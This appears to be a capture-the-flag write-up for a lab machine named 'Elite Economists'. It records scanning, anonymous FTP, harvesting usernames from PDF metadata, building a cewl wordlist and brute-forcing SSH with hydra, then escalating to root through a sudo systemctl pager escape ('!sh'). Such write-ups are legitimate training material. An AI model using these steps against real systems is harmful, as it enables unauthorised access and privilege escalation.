@@ -1,0 +1,328 @@
+			ENUMERATION
+
+			
+---ifconfig---
+                                                                                                                    
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 2102023  bytes 936641156 (893.2 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 2106818  bytes 313681712 (299.1 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 5445  bytes 1443282 (1.3 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 5445  bytes 1443282 (1.3 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+
+---netdiscover to discover the ip of our target---
+
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+ Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts                                                   
+                                                                                                                   
+ 44 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 2640                                                 
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00     11     660  Unknown vendor                                                  
+ 10.0.2.2        52:54:00:12:35:00     11     660  Unknown vendor                                                  
+ 10.0.2.3        08:00:27:ad:a3:a8     11     660  PCS Systemtechnik GmbH                                          
+ 10.0.2.46       08:00:27:e0:55:e3     11     660  PCS Systemtechnik GmbH                                          
+
+zsh: suspended  netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+                                                                                                                    
+
+
+
+---nmap on target---
+
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.46 -sS -sC -sV -A -T4 -p-    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-29 22:11 +03
+Nmap scan report for 10.0.2.46
+Host is up (0.00081s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.0.2.15
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-rw-r--    1 1000     1000       173864 Sep 13  2023 Brochure-1.pdf
+| -rw-rw-r--    1 1000     1000       183931 Sep 13  2023 Brochure-2.pdf
+| -rw-rw-r--    1 1000     1000       465409 Sep 13  2023 Financial-infographics-poster.pdf
+| -rw-rw-r--    1 1000     1000       269546 Sep 13  2023 Gameboard-poster.pdf
+| -rw-rw-r--    1 1000     1000       126644 Sep 13  2023 Growth-timeline.pdf
+|_-rw-rw-r--    1 1000     1000      1170323 Sep 13  2023 Population-poster.pdf
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 d9:fe:dc:77:b8:fc:e6:4c:cf:15:29:a7:e7:21:a2:62 (RSA)
+|   256 be:66:01:fb:d5:85:68:c7:25:94:b9:00:f9:cd:41:01 (ECDSA)
+|_  256 18:b4:74:4f:f2:3c:b3:13:1a:24:13:46:5c:fa:40:72 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Home - Elite Economists
+MAC Address: 08:00:27:E0:55:E3 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5
+OS details: Linux 5.0 - 5.5
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.81 ms 10.0.2.46
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 46.22 seconds
+                       
+
+
+---we see open ftp, ssh and http ports---
+
+
+
+---anonymous ftp login is allowed---
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/ELITE ECONOMISTS CTF]
+└─# ftp 10.0.2.46
+Connected to 10.0.2.46.
+220 (vsFTPd 3.0.3)
+Name (10.0.2.46:okina): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||13565|)
+150 Here comes the directory listing.
+-rw-rw-r--    1 1000     1000       173864 Sep 13  2023 Brochure-1.pdf
+-rw-rw-r--    1 1000     1000       183931 Sep 13  2023 Brochure-2.pdf
+-rw-rw-r--    1 1000     1000       465409 Sep 13  2023 Financial-infographics-poster.pdf
+-rw-rw-r--    1 1000     1000       269546 Sep 13  2023 Gameboard-poster.pdf
+-rw-rw-r--    1 1000     1000       126644 Sep 13  2023 Growth-timeline.pdf
+-rw-rw-r--    1 1000     1000      1170323 Sep 13  2023 Population-poster.pdf
+226 Directory send OK.
+
+ftp> get Brochure-1.pdf
+100% |********************************************************|   169 KiB   20.15 MiB/s    00:00 ETA
+226 Transfer complete.
+
+
+
+---lets download those files and take a look at them---
+
+
+---in one of the files (gameboard) I see an email adress and website adress, lets use exif tool to get info---
+
+
+Exif: A tool to write and read meta information from files
+
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/ELITE ECONOMISTS CTF]
+└─# exiftool *.pdf | grep Author                                         
+Author                          : joseph
+Author                          : richard
+Author                          : crystal
+Author                          : catherine
+Author                          : catherine
+                                           
+
+
+---we use *.pdf so that tool is used on files with .pdf extensions and grep Author to see the owners of the files,
+possibly employees---
+
+
+
+---I save these names into a text file, so we can try a dictionary based brute force attack with hydra---
+
+
+
+---first I will the check the website itself to gain additional information. It looks like an account agency---
+
+
+
+---I check its pages and run some web enumeration scans but I don't get any valuable information, lets
+ get back to our brute force attack---
+
+
+
+
+---To save time, we can create a wordlist based on the words that is being used in the website. For that we
+can use the cewl tool---
+
+
+
+Cewl: A custom wordlist generator that can scan a website's ip and then create a wordlist based on the words
+used there
+
+
+
+                                                                                
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/ELITE ECONOMISTS CTF]
+└─# cewl -d 2 -m 5 -w passwords.txt http://10.0.2.46
+CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+
+
+
+---created a wordlist named passwords.txt, lets crack it using hydra---
+
+
+                                                                                
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/ELITE ECONOMISTS CTF]
+└─# hydra -L users.txt -P passwords.txt  ssh://10.0.2.46 -t 64
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-30 16:03:42
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 1328 login tries (l:4/p:332), ~21 tries per task
+[DATA] attacking ssh://10.0.2.46:22/
+[22][ssh] host: 10.0.2.46   login: joseph   password: wealthiest
+^Z
+zsh: suspended  hydra -L users.txt -P passwords.txt ssh://10.0.2.46 -t 64
+                        
+
+
+
+---here we got our credentials username=joseph password=wealthiest, lets ssh into the server---
+
+
+
+
+			      GAINING FOOTHOLD
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# ssh joseph@10.0.2.46               
+The authenticity of host '10.0.2.46 (10.0.2.46)' can't be established.
+ED25519 key fingerprint is SHA256:nKBoUMUnxyKH34KaiDU6gjV4RVOrd181pL9rHCLLD0s.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.0.2.46' (ED25519) to the list of known hosts.
+joseph@10.0.2.46's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue 30 Apr 2024 01:06:28 PM UTC
+
+
+joseph@elite-economists:~$ 
+
+
+---we are in---
+		
+
+joseph@elite-economists:~$ ls
+user.txt
+joseph@elite-economists:~$ cat user.txt
+
+---First User Flag---	
+			
+
+
+
+
+	
+			PRIVILEGE ESCALATION
+
+
+
+---lets check the if this user has any root permissions---
+
+
+joseph@elite-economists:~$ sudo -l
+Matching Defaults entries for joseph on elite-economists:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User joseph may run the following commands on elite-economists:
+    (ALL) NOPASSWD: /usr/bin/systemctl status
+
+
+
+---there is a command our user can run to gain root access, a quick visit to gtfobins to check for a privilege
+escalation---
+		
+
+
+---I go to systemct page on gtfobins and find sudo commands, I will try them one by one---
+
+
+sudo systemctl
+!sh
+
+
+---Lets start with this one---
+
+
+joseph@elite-economists:~$ sudo /usr/bin/systemctl status
+● elite-economists
+    State: running
+     Jobs: 0 queued
+   Failed: 0 units
+    Since: Tue 2024-04-30 12:42:18 UTC; 34min ago
+   CGroup: /
+           ├─user.slice 
+           │ └─user-1001.slice 
+           │   ├─session-3.scope 
+           │   │ ├─2059 sshd: joseph [priv]
+           │   │ ├─2154 sshd: joseph@pts/0
+           │   │ ├─2155 -bash
+           │   │ ├─2231 sudo /usr/bin/systemctl status
+           │   │ ├─2232 /usr/bin/systemctl status
+           │   │ └─2233 pager
+           │   └─user@1001.service …
+           │     └─init.scope 
+           │       ├─2068 /lib/systemd/systemd --user
+           │       └─2069 (sd-pam)
+           ├─init.scope 
+           │ └─1 /sbin/init maybe-ubiquity
+           └─system.slice 
+             ├─apache2.service 
+             │ ├─757 /usr/sbin/apache2 -k start
+             │ ├─759 /usr/sbin/apache2 -k start
+!sh
+# whoami
+root
+
+
+---priv escalate successful---
+
+
+# cd /root
+# ls
+root.txt  snap
+# cat root.txt
+
+---Root User Flag---
+
